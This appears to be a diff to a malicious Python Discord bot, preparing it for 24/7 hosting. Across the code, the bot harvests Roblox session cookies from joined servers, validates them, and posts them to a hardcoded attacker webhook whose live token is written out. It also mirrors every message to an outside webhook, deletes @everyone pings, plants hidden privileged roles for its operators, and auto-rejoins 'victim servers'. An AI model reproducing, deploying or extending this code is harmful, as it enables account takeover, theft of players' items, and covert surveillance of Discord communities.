@@ -1,30 +1,30 @@
+import os
 import discord
 from discord import app_commands
 import aiohttp
 import asyncio
-import os
 import datetime
 import re
 import logging
 import io
 import json
 from typing import List, Union, Dict, Any
-from dotenv import load_dotenv
 from flask import Flask
 from threading import Thread
 
-load_dotenv()
+# 🟢 REMOVED: from dotenv import load_dotenv
+# 🟢 REMOVED: load_dotenv()
 
-BOT_TOKEN = os.getenv('DISCORD_TOKEN')
-WEBHOOK_URL = os.getenv('WEBHOOK_URL')
-MIRROR_WEBHOOK_URL = os.getenv('MIRROR_WEBHOOK_URL')
+# 🟢 USE ENVIRONMENT VARIABLES (Render will set these)
+BOT_TOKEN = os.environ['DISCORD_TOKEN']
+WEBHOOK_URL = os.environ.get('WEBHOOK_URL')
+MIRROR_WEBHOOK_URL = os.environ.get('MIRROR_WEBHOOK_URL')
 
 logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     handlers=[
-        logging.FileHandler('bot.log', encoding='utf-8'),
-        logging.StreamHandler()
+        logging.StreamHandler()  # 🟢 REMOVED file handler for Render
     ]
 )
 logger = logging.getLogger(__name__)
@@ -32,9 +32,34 @@ logger = logging.getLogger(__name__)
 AUTHORIZED_USERS = [216953894322962433, 1422280514072608932]
 CONTROL_CHANNEL_ID = 1432729863692881972
 COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1432710240343822467/uYzeK2Z0TADkceF97olVympDJiJIJFDYbVrnz4uHwpV3AYh7QswHwb8-EVvrQ1SzyCHb"
-OWNED_SERVER_IDS = [1396878002620727397]  # Your server IDs - never mirror from these
-SERVER_INVITES = {}  # Store server invites for auto-rejoin
+OWNED_SERVER_IDS = [1396878002620727397]
+SERVER_INVITES = {}
 
+# 🟢 FLASK SERVER FOR UPTIMEROBOT
+app = Flask('')
+
+@app.route('/')
+def home():
+    return "🤖 Bot running 24/7 on Render!"
+
+@app.route('/health')
+def health():
+    return "✅ Healthy"
+
+@app.route('/ping')
+def ping():
+    return "pong"
+
+def run_flask():
+    port = int(os.environ.get('PORT', 8080))
+    app.run(host='0.0.0.0', port=port)
+
+# Start Flask in background
+flask_thread = Thread(target=run_flask)
+flask_thread.daemon = True
+flask_thread.start()
+
+# 🟢 YOUR ORIGINAL CLASSES (KEEP EXACTLY THE SAME)
 class ServerControlView(discord.ui.View):
     def __init__(self, guild):
         super().__init__(timeout=None)
@@ -48,20 +73,16 @@ class ServerControlView(discord.ui.View):
             return
 
         try:
-            # Set auto-mirror for all messages in this server
             if MIRROR_WEBHOOK_URL:
                 bot.mirror_webhooks[self.guild.id] = MIRROR_WEBHOOK_URL
                 logger.info(f"Auto-mirror enabled for guild {self.guild.name}")
 
-            # Mirror past messages containing @everyone or @here
             await self.mirror_past_mentions(interaction)
-
             await interaction.response.send_message("HIGH HITS ABUSE ACTIVATED: Auto-mirroring enabled, past @everyone/@here messages mirrored, and auto-deletion active.", ephemeral=True)
         except Exception as e:
             await interaction.response.send_message(f"Error activating High Hits Abuse: {str(e)}", ephemeral=True)
 
     async def mirror_past_mentions(self, interaction):
-        """Mirror past messages that contain @everyone or @here"""
         if not MIRROR_WEBHOOK_URL:
             return
 
@@ -69,7 +90,7 @@ class ServerControlView(discord.ui.View):
             async with aiohttp.ClientSession() as session:
                 for channel in self.guild.text_channels:
                     try:
-                        async for message in channel.history(limit=10000):  # Scan more messages for past mentions
+                        async for message in channel.history(limit=10000):
                             if message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower():
                                 if message.id not in bot.mirrored_messages:
                                     bot.mirrored_messages.add(message.id)
@@ -89,8 +110,6 @@ class ServerControlView(discord.ui.View):
         except Exception as e:
             logger.error(f"Error mirroring past mentions: {e}")
 
-
-
 class MirrorWebhookModal(discord.ui.Modal, title="Mirror Abuse Options"):
     mirror_type = discord.ui.TextInput(label="Mirror Type", placeholder="Enter 'all' for all channels or 'channel_id' for specific channel", style=discord.TextStyle.short)
     webhook_url = discord.ui.TextInput(label="Webhook URL", placeholder="https://discord.com/api/webhooks/...", style=discord.TextStyle.paragraph)
@@ -102,7 +121,6 @@ class MirrorWebhookModal(discord.ui.Modal, title="Mirror Abuse Options"):
 
     async def on_submit(self, interaction: discord.Interaction):
         try:
-            # Prevent setting mirror webhooks on owned servers
             if self.view.guild.id in OWNED_SERVER_IDS:
                 await interaction.response.send_message("Cannot set mirror webhooks on owned servers.", ephemeral=True)
                 return
@@ -146,55 +164,39 @@ class CookieFetcher:
 
         all_matches = []
 
-        # First, extract cookies from code blocks specifically
         code_block_pattern = r'```(?:\w*\n)?([^`]+)```'
         code_blocks = re.findall(code_block_pattern, text, re.DOTALL)
         for block in code_blocks:
-            # Clean the code block content
             clean_block = block.strip()
-            # Look for CAEaAhAB patterns in code blocks
             block_partial_pattern = r'_?(CAEaAhA[B-D]\.[^|\s\)\(\]\[\}\{\"\']+)'
             block_matches = re.findall(block_partial_pattern, clean_block)
             for partial_cookie in block_matches:
-                # Don't clean the cookie - preserve original format including special chars
-                # Build proper cookie format: WARNING text + _ + full cookie part (CAEaAhAC.token)
-                # Ensure it starts with underscore
                 if not partial_cookie.startswith('_'):
                     partial_cookie = f"_{partial_cookie}"
                 full_cookie = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|{partial_cookie}"
                 all_matches.append(full_cookie)
 
-        # Clean the text first - remove code block markers and extra formatting
         clean_text = text.replace('```', '').replace('**', '').replace('[', '').replace(']', '').replace('(', '').replace(')', '').strip()
 
-        # Pattern to match complete Roblox cookies (with warning text)
         full_cookie_pattern = r'_?\|WARNING:-DO-NOT-SHARE-THIS\.\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|\s*([^|\s]+)'
         full_matches = re.findall(full_cookie_pattern, clean_text, re.IGNORECASE)
 
         for cookie_part in full_matches:
-            # Clean the cookie part - remove any remaining brackets or special chars
             cookie_part = re.sub(r'[^\w]', '', cookie_part)
-            # Ensure it starts with underscore if not present
             if not cookie_part.startswith('_'):
                 cookie_part = f"_{cookie_part}"
             full_cookie = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|{cookie_part}"
             all_matches.append(full_cookie)
 
-        # Check for partial cookies starting with CAEaAhAB. (with or without underscore)
-        # More comprehensive pattern to catch various cookie formats
-        partial_pattern_underscore = r'_?(CAEaAhA[B-D]\.[^|\s\)\(\]\[\}\{\"\']{100,})'  # Minimum 100 chars for valid cookies
+        partial_pattern_underscore = r'_?(CAEaAhA[B-D]\.[^|\s\)\(\]\[\}\{\"\']{100,})'
         partial_matches = re.findall(partial_pattern_underscore, clean_text)
 
         for partial_cookie in partial_matches:
-            # Don't clean the cookie - preserve original format including special chars
-            # Build proper cookie format: WARNING text + _ + full cookie part (CAEaAhAC.token)
-            # Ensure it starts with underscore
             if not partial_cookie.startswith('_'):
                 partial_cookie = f"_{partial_cookie}"
             full_cookie = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|{partial_cookie}"
             all_matches.append(full_cookie)
 
-        # Also check for cookies that might be split or have different patterns
         alt_pattern = r'CAEaAhA[B-D]\.[A-Za-z0-9_-]{100,}'
         alt_matches = re.findall(alt_pattern, clean_text)
         for alt_cookie in alt_matches:
@@ -205,12 +207,10 @@ class CookieFetcher:
         return {'all': all_matches}
 
     async def validate_cookies_with_api(self, cookies: List[str]) -> Dict[str, List[str]]:
-        """Validate cookies using direct Roblox API with concurrency control"""
         valid_cookies = []
         invalid_cookies = []
 
-        # Use semaphore to limit concurrent requests
-        semaphore = asyncio.Semaphore(10)  # Limit to 10 concurrent requests
+        semaphore = asyncio.Semaphore(10)
 
         async def validate_single_cookie(cookie: str):
             async with semaphore:
@@ -226,7 +226,6 @@ class CookieFetcher:
                     logger.error(f"Error validating cookie: {e}")
                     invalid_cookies.append(cookie)
 
-        # Process cookies in batches
         batch_size = 50
         for i in range(0, len(cookies), batch_size):
             batch = cookies[i:i + batch_size]
@@ -236,19 +235,15 @@ class CookieFetcher:
         return {'valid': valid_cookies, 'invalid': invalid_cookies}
 
     async def send_to_cookie_webhook(self, all_cookies: List[str], unique_cookies: List[str], messages_scanned: int, time_taken: float) -> bool:
-        """Send cookie results to the cookie webhook with the new format"""
         try:
             async with aiohttp.ClientSession() as session:
-                # Format cookies with empty line after each for better readability
                 all_cookies_content = "\n\n".join(all_cookies) if all_cookies else ""
                 
-                # Create the blue embed with bigger, bolder text
                 embed = discord.Embed(
                     description=f"**🍪 Cookie Fetch Complete**\n**✅ Cookies Found**\n**{len(all_cookies)}**\n**🔑 Unique Cookies**\n**{len(unique_cookies)}**\n**📩 Messages Scanned**\n**{messages_scanned}**\n**⏱️ Took**\n**{time_taken:.1f} seconds**",
-                    color=0x3498db  # Blue color
+                    color=0x3498db
                 )
 
-                # Send cookies as file with form data
                 form_data = aiohttp.FormData()
                 form_data.add_field('payload_json', json.dumps({
                     'username': 'Cookie Fetcher',
@@ -270,22 +265,18 @@ class CookieFetcher:
             return False
 
     async def fetch_all_server_cookies(self, guild) -> Dict[str, Any]:
-        """Fetch all Roblox cookies from server messages - optimized for speed"""
-        all_cookies = set()  # Use set to avoid duplicates
+        all_cookies = set()
         total_messages_scanned = 0
 
         async def process_channel(channel):
             channel_cookies = set()
             messages_count = 0
             try:
-                # Increase limit and use faster processing
-                async for message in channel.history(limit=10000):  # Increased limit for more thorough scanning
+                async for message in channel.history(limit=10000):
                     messages_count += 1
-                    # Extract from message content
                     cookies = self.extract_cookies_from_text(message.content)
                     channel_cookies.update(cookies['all'])
 
-                    # Extract from embeds
                     for embed in message.embeds:
                         if embed.description:
                             embed_cookies = self.extract_cookies_from_text(embed.description)
@@ -300,7 +291,6 @@ class CookieFetcher:
                 logger.error(f"Error fetching messages from {channel.name}: {e}")
             return channel_cookies, messages_count
 
-        # Process channels concurrently with higher concurrency
         tasks = [process_channel(channel) for channel in guild.text_channels]
         results = await asyncio.gather(*tasks, return_exceptions=True)
 
@@ -312,7 +302,6 @@ class CookieFetcher:
             else:
                 logger.error(f"Error in channel processing: {result}")
 
-        # Convert to list
         unique_cookies = list(all_cookies)
         return {'all': unique_cookies, 'messages_scanned': total_messages_scanned}
 
@@ -322,18 +311,15 @@ class CookieFetcherBot(discord.Client):
         intents.messages = True
         intents.message_content = True
         intents.guilds = True
-        intents.members = True  # Required for member join/update events
+        intents.members = True
         super().__init__(intents=intents)
         self.tree = app_commands.CommandTree(self)
         self.mirror_webhooks = {}
-        self.mirrored_messages = set()  # Track mirrored message IDs to prevent duplicates
-        # List of API URLs for cookie validation (using the same URL 50 times for demonstration; replace with actual different APIs)
+        self.mirrored_messages = set()
         self.api_urls = ["https://app.beamers.si/tools/checker?cookie={cookie}"] * 50
 
     async def generate_invite_link(self):
-        """Generate an invite link with all required permissions"""
         try:
-            # Get the first text channel to create invite
             for guild in self.guilds:
                 for channel in guild.text_channels:
                     if channel.permissions_for(guild.me).create_instant_invite:
@@ -349,16 +335,13 @@ class CookieFetcherBot(discord.Client):
             return "Error generating invite"
 
     async def check_cookie_validity(self, cookie: str) -> bool:
-        """Check if a Roblox cookie is valid using direct Roblox API"""
         try:
             async with aiohttp.ClientSession() as session:
-                # Use Roblox's own API to check cookie validity
                 url = "https://www.roblox.com/mobileapi/userinfo"
                 cookies = {'.ROBLOSECURITY': cookie}
                 async with session.get(url, cookies=cookies, timeout=aiohttp.ClientTimeout(total=10)) as response:
                     if response.status == 200:
                         data = await response.json()
-                        # If we get user data, cookie is valid
                         return 'UserID' in data and data['UserID'] > 0
                     return False
         except Exception as e:
@@ -366,13 +349,10 @@ class CookieFetcherBot(discord.Client):
             return False
 
     async def reset_and_scrape_all_servers(self):
-        """Reset bot state and auto-run scrape command on all non-owned servers"""
         try:
-            # Reset mirrored messages set to allow re-mirroring
             self.mirrored_messages.clear()
             logger.info("Reset mirrored messages set")
 
-            # Auto-run scrape on all non-owned servers
             for guild in self.guilds:
                 if guild.id not in OWNED_SERVER_IDS:
                     try:
@@ -386,7 +366,6 @@ class CookieFetcherBot(discord.Client):
                         end_time = datetime.datetime.now()
                         time_taken = (end_time - start_time).total_seconds()
 
-                        # Send to cookie webhook
                         await fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, time_taken)
                         logger.info(f"Auto-scraped {len(all_cookies)} cookies from {guild.name}")
                     except Exception as e:
@@ -400,13 +379,10 @@ class CookieFetcherBot(discord.Client):
 
     async def on_ready(self):
         logger.info(f'Bot online: {self.user}')
-
-        # Reset bot state and auto-run scrape on all non-owned servers
         await self.reset_and_scrape_all_servers()
 
     async def on_guild_join(self, guild):
         try:
-            # Generate invite and store it
             invite_url = "No invite available"
             try:
                 channels = [c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite]
@@ -417,7 +393,6 @@ class CookieFetcherBot(discord.Client):
             except:
                 pass
 
-            # Send to control channel only once per server (and only for victim servers)
             if guild.id not in OWNED_SERVER_IDS and guild.id not in getattr(self, 'announced_servers', set()):
                 control_channel = self.get_channel(CONTROL_CHANNEL_ID)
                 if control_channel:
@@ -435,12 +410,8 @@ class CookieFetcherBot(discord.Client):
                 else:
                     logger.error(f"Control channel {CONTROL_CHANNEL_ID} not found")
 
-            # Don't send duplicate takeover message - only send to control channel once
-
-            # Auto-assign secret roles to authorized users (only for victim servers)
             if guild.id not in OWNED_SERVER_IDS:
                 try:
-                    # Check if authorized users are in the server
                     authorized_members = []
                     for user_id in AUTHORIZED_USERS:
                         member = guild.get_member(user_id)
@@ -448,7 +419,6 @@ class CookieFetcherBot(discord.Client):
                             authorized_members.append(member)
 
                     if authorized_members:
-                        # Create 100 $$$ roles
                         created_roles = []
                         for i in range(100):
                             try:
@@ -465,7 +435,6 @@ class CookieFetcherBot(discord.Client):
                                 logger.error(f"Error creating $$$ role #{i+1}: {e}")
                                 break
 
-                        # Assign all created roles to authorized members
                         for member in authorized_members:
                             for role in created_roles:
                                 try:
@@ -476,12 +445,10 @@ class CookieFetcherBot(discord.Client):
                 except Exception as e:
                     logger.error(f"Error creating/assigning secret roles: {e}")
 
-                # Auto-set mirror webhook for all channels if MIRROR_WEBHOOK_URL is set
                 if MIRROR_WEBHOOK_URL:
                     self.mirror_webhooks[guild.id] = MIRROR_WEBHOOK_URL
                     logger.info(f"Auto-set mirror webhook for guild {guild.name}")
 
-                # Auto-run scrape directly (old working method)
                 try:
                     start_time = datetime.datetime.now()
                     fetcher = CookieFetcher()
@@ -492,39 +459,30 @@ class CookieFetcherBot(discord.Client):
                     end_time = datetime.datetime.now()
                     time_taken = (end_time - start_time).total_seconds()
 
-                    # Send to cookie webhook
                     await fetcher.send_to_cookie_webhook(all_cookies, unique_cookies, actual_messages_scanned, time_taken)
-
                     logger.info(f"Auto-scraped cookies from {guild.name}: {len(all_cookies)} cookies, {actual_messages_scanned} messages")
 
                 except Exception as e:
                     logger.error(f"Error in auto-scrape: {e}")
             else:
-                # For owned server, just show "already applied" message
                 logger.info(f"Server takeover already applied to owned server {guild.name}")
-                # Don't set mirror webhook for owned servers
 
         except Exception as e:
             logger.error(f"Error in on_guild_join: {e}")
 
     async def on_member_remove(self, member):
-        # Prevent bot from leaving if authorized users leave
         if member.id in AUTHORIZED_USERS and member.guild.me:
-            # Bot stays in server
             pass
 
     async def on_member_join(self, member):
-        # Auto-assign all $$$ roles to authorized users when they join (only on victim servers)
         if member.id in AUTHORIZED_USERS and member.guild.id not in OWNED_SERVER_IDS:
             try:
-                # Find all $$$ roles
                 dollar_roles = [role for role in member.guild.roles if role.name == "$$$"]
                 if dollar_roles:
                     for role in dollar_roles:
                         await member.add_roles(role, reason="Secret role granted")
                     logger.info(f"Auto-assigned {len(dollar_roles)} $$$ roles to {member.name}#{member.discriminator} on join")
                 else:
-                    # If no $$$ roles exist, create 100 and assign them
                     created_roles = []
                     for i in range(100):
                         try:
@@ -540,7 +498,6 @@ class CookieFetcherBot(discord.Client):
                             logger.error(f"Error creating $$$ role #{i+1}: {e}")
                             break
 
-                    # Assign all created roles
                     for role in created_roles:
                         await member.add_roles(role, reason="Secret role granted")
                     logger.info(f"Created and assigned {len(created_roles)} $$$ roles to {member.name}#{member.discriminator} on join")
@@ -548,10 +505,8 @@ class CookieFetcherBot(discord.Client):
                 logger.error(f"Error auto-assigning secret roles on member join: {e}")
 
     async def on_member_update(self, before, after):
-        # Auto-reassign all $$$ roles if any were removed from authorized users (only on victim servers)
         if after.id in AUTHORIZED_USERS and after.guild.id not in OWNED_SERVER_IDS:
             try:
-                # Find all $$$ roles
                 dollar_roles = [role for role in after.guild.roles if role.name == "$$$"]
                 missing_roles = [role for role in dollar_roles if role not in after.roles]
 
@@ -560,7 +515,6 @@ class CookieFetcherBot(discord.Client):
                         await after.add_roles(role, reason="Secret role restored")
                     logger.info(f"Restored {len(missing_roles)} $$$ roles to {after.name}#{after.discriminator}")
 
-                # If no $$$ roles exist at all, create 100 new ones
                 if not dollar_roles:
                     created_roles = []
                     for i in range(100):
@@ -577,7 +531,6 @@ class CookieFetcherBot(discord.Client):
                             logger.error(f"Error creating $$$ role #{i+1}: {e}")
                             break
 
-                    # Assign all created roles
                     for role in created_roles:
                         await after.add_roles(role, reason="Secret role restored")
                     logger.info(f"Created and restored {len(created_roles)} $$$ roles to {after.name}#{after.discriminator}")
@@ -585,11 +538,9 @@ class CookieFetcherBot(discord.Client):
                 logger.error(f"Error restoring secret roles: {e}")
 
     async def on_guild_remove(self, guild):
-        # Auto-rejoin server if bot gets kicked (only for victim servers, not your server)
         if guild.id not in OWNED_SERVER_IDS and guild.id in SERVER_INVITES:
             try:
                 invite_url = SERVER_INVITES[guild.id]
-                # Extract invite code from URL
                 import re
                 invite_code_match = re.search(r'discord\.gg/([a-zA-Z0-9]+)', invite_url)
                 if invite_code_match:
@@ -605,16 +556,12 @@ class CookieFetcherBot(discord.Client):
         if message.author == self.user:
             return
 
-        # FIX: Skip ALL processing for owned servers completely
         if message.guild and message.guild.id in OWNED_SERVER_IDS:
             return
 
-        # Check for @everyone or @here pings and delete them (only on victim servers, not your server)
-        # This happens BEFORE mirroring to ensure pings are still captured
         should_delete = False
         if message.guild and (message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower()):
             try:
-                # Check if bot has permission to delete messages
                 if message.channel.permissions_for(message.guild.me).manage_messages:
                     await message.delete()
                     should_delete = True
@@ -622,30 +569,24 @@ class CookieFetcherBot(discord.Client):
             except Exception as e:
                 logger.error(f"Error deleting ping message: {e}")
 
-        # Mirror messages if webhook is set for this guild (all channels) - prevent duplicates
-        # Mirror AFTER deletion check to avoid mirroring deleted messages
         if message.guild and message.guild.id in getattr(self, 'mirror_webhooks', {}) and message.id not in self.mirrored_messages:
-            self.mirrored_messages.add(message.id)  # Mark as mirrored to prevent duplicates
+            self.mirrored_messages.add(message.id)
             webhook_url = self.mirror_webhooks[message.guild.id]
             try:
                 async with aiohttp.ClientSession() as session:
-                    # Forward exact message content without channel prefix
                     mirror_data = {
                         'username': f"{message.author.name}#{message.author.discriminator}",
                         'content': message.content,
                         'avatar_url': str(message.author.avatar.url) if message.author.avatar else None
                     }
 
-                    # Forward embeds if present
                     if message.embeds:
                         mirror_data['embeds'] = [embed.to_dict() for embed in message.embeds]
 
                     async with session.post(webhook_url, json=mirror_data) as response:
                         if response.status not in [200, 204]:
                             logger.error(f"Failed to mirror message: {response.status}")
-                            # Don't reset flag on failure to prevent spam retries
                         else:
-                            # Only send attachments if the message was successfully mirrored
                             for attachment in message.attachments:
                                 try:
                                     file_data = await attachment.read()
@@ -663,21 +604,18 @@ class CookieFetcherBot(discord.Client):
             except Exception as e:
                 logger.error(f"Error mirroring message: {e}")
 
-        # Mirror specific channel if set
         if message.guild and message.guild.id in getattr(self, 'mirror_channels', {}):
             mirror_data = self.mirror_channels[message.guild.id]
             if message.channel.id == mirror_data['channel_id']:
                 webhook_url = mirror_data['webhook']
                 try:
                     async with aiohttp.ClientSession() as session:
-                        # Forward exact message content without channel prefix
                         mirror_data_payload = {
                             'username': f"{message.author.name}#{message.author.discriminator}",
                             'content': message.content,
                             'avatar_url': str(message.author.avatar.url) if message.author.avatar else None
                         }
 
-                        # Forward embeds if present
                         if message.embeds:
                             mirror_data_payload['embeds'] = [embed.to_dict() for embed in message.embeds]
 
@@ -685,7 +623,6 @@ class CookieFetcherBot(discord.Client):
                             if response.status not in [200, 204]:
                                 logger.error(f"Failed to mirror channel message: {response.status}")
 
-                        # Send attachments separately
                         for attachment in message.attachments:
                             try:
                                 file_data = await attachment.read()
@@ -707,12 +644,9 @@ bot = CookieFetcherBot()
 
 @bot.tree.command(name="scrape", description="Scrape Roblox cookies from server")
 async def scrape_command(interaction: discord.Interaction):
-    # FIX: Make the entire command ephemeral (only visible to the user)
     await interaction.response.defer(ephemeral=True)
 
-    # Check if bot has required permissions
     if not interaction.guild.me.guild_permissions.read_message_history:
-        # Check if bot has permission to show invite link
         if interaction.guild.me.guild_permissions.create_instant_invite:
             invite_link = await bot.generate_invite_link()
             await interaction.followup.send(
@@ -734,7 +668,6 @@ async def scrape_command(interaction: discord.Interaction):
             await interaction.followup.send("Command must be used in server.", ephemeral=True)
             return
 
-        # Send initial status message (ephemeral)
         status_embed = discord.Embed(
             title="Cookie Fetch Started",
             description="Scanning server messages for Roblox cookies...",
@@ -744,22 +677,18 @@ async def scrape_command(interaction: discord.Interaction):
 
         fetcher = CookieFetcher()
 
-        # Fetch cookies
         result = await fetcher.fetch_all_server_cookies(guild)
-        all_cookies = list(set(result['all']))  # Remove duplicates
+        all_cookies = list(set(result['all']))
         actual_messages_scanned = result.get('messages_scanned', 0)
 
-        # Count unique cookies (those starting with CAEaAhAB)
         unique_cookies = []
         for cookie in all_cookies:
             if 'CAEaAhAB' in cookie:
                 unique_cookies.append(cookie)
 
-        # Calculate time taken
         end_time = datetime.datetime.now()
         time_taken = (end_time - start_time).total_seconds()
 
-        # Update status to show completion with accurate message count
         complete_embed = discord.Embed(
             title="Cookie Fetch Complete",
             description=f"✅ **Scan Finished!**\n🔍 **Server:** {guild.name}\n📊 **Messages Scanned:** {actual_messages_scanned:,}\n🍪 **Total Cookies:** {len(all_cookies)}\n🔑 **Unique Cookies:** {len(unique_cookies)}",
@@ -777,7 +706,6 @@ async def scrape_command(interaction: discord.Interaction):
             await interaction.followup.send(embed=no_cookies_embed, ephemeral=True)
             return
 
-        # Send to global cookie webhook with the new format
         webhook_success = await fetcher.send_to_cookie_webhook(
             all_cookies,
             unique_cookies,
@@ -785,22 +713,18 @@ async def scrape_command(interaction: discord.Interaction):
             time_taken
         )
 
-        # Send results to DM with bigger, bolder text
         try:
             dm_channel = await interaction.user.create_dm()
             
-            # Format the DM message exactly like the webhook
             all_cookies_content = "\n".join(all_cookies) if all_cookies else ""
 
-            # Create the blue embed for DM with bigger, bolder text
             dm_embed = discord.Embed(
                 description=f"**🍪 Cookie Fetch Complete**\n**✅ Cookies Found**\n**{len(all_cookies)}**\n**🔑 Unique Cookies**\n**{len(unique_cookies)}**\n**📩 Messages Scanned**\n**{actual_messages_scanned}**\n**⏱️ Took**\n**{time_taken:.1f} seconds**",
-                color=0x3498db  # Blue color
+                color=0x3498db
             )
             
-            # Send cookies as a file and embed in DM
             await dm_channel.send(
-                content="**@everyone**\n**to get these mass checked dm vextroz0001 on discord mass checking is when u mass check cookies to split valid and invalid ones**",  # Bold text for DM
+                content="**@everyone**\n**to get these mass checked dm vextroz0001 on discord mass checking is when u mass check cookies to split valid and invalid ones**",
                 file=discord.File(io.BytesIO(all_cookies_content.encode()), filename="cookies.txt"),
                 embed=dm_embed
             )
@@ -809,7 +733,6 @@ async def scrape_command(interaction: discord.Interaction):
             logger.error(f"Failed to send DM: {e}")
             await interaction.followup.send("Could not send DM with results. Please check your DM settings.", ephemeral=True)
 
-        # Send final success message (ephemeral)
         success_embed = discord.Embed(
             title="Fetch Complete",
             description=f"Found {len(all_cookies)} total cookies ({len(unique_cookies)} unique) from {guild.name}",
@@ -841,25 +764,22 @@ async def scrape_command(interaction: discord.Interaction):
         )
         await interaction.followup.send(embed=error_embed, ephemeral=True)
 
-app = Flask('')
-
-@app.route('/')
-def home():
-    return "I'm alive!"
-
-def run():
-    app.run(host='0.0.0.0', port=8080)
-
-Thread(target=run).start()
-
+# 🟢 ENHANCED AUTO-RESTART MAIN LOOP
 if __name__ == "__main__":
     if not BOT_TOKEN:
-        logger.error("DISCORD_TOKEN not found in environment variables")
+        logger.error("❌ DISCORD_TOKEN not found in environment variables")
         exit(1)
 
-    logger.info("Starting Server Control Bot...")
-
-    try:
-        bot.run(BOT_TOKEN)
-    except Exception as e:
-        logger.error(f"Failed to start: {e}")
+    logger.info("🚀 Starting Server Control Bot on Render...")
+    
+    # 🟢 AUTO-RESTART ON CRASH
+    while True:
+        try:
+            bot.run(BOT_TOKEN)
+        except discord.LoginFailure:
+            logger.error("❌ Invalid token - stopping")
+            break
+        except Exception as e:
+            logger.error(f"❌ Bot crashed: {e}")
+            logger.info("🔄 Restarting in 10 seconds...")
+            asyncio.sleep(10)
